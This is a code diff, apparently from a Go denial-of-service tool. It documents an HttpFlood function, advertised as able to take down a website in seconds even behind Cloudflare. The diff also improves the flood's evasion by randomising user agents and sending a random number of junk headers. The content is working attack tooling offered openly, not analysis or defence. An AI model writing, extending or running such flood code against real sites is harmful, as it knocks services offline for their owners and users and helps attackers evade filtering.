@@ -8,6 +8,15 @@ import (
 	"github.com/brianvoe/gofakeit/v6"
 )
 
+// Initiate a HTTP flood attack. This attack is very powerful and can take down a website in seconds. This attack works even when a website is behind cloudflare.
+//
+// url - URL/IP/HOSTNAME to use
+//
+// t - timeout in sec
+//
+// g - amount of goroutines
+//
+// w - Time to wait between requests in ms
 func HttpFlood(url string, t int64, g, w int) (channel chan string) {
 	hc := http.Client{Timeout: time.Duration(t) * time.Second}
 
@@ -25,8 +34,11 @@ func HttpFlood(url string, t int64, g, w int) (channel chan string) {
 					continue
 				}
 
+				// Add user agent
 				req.Header.Set("User-Agent", gofakeit.UserAgent())
-				for i := 0; i < 5; i++ {
+
+				// Add some random headers
+				for i := 0; i < gofakeit.Number(1, 10); i++ {
 					req.Header.Set(gofakeit.Word(), gofakeit.Word())
 				}
 
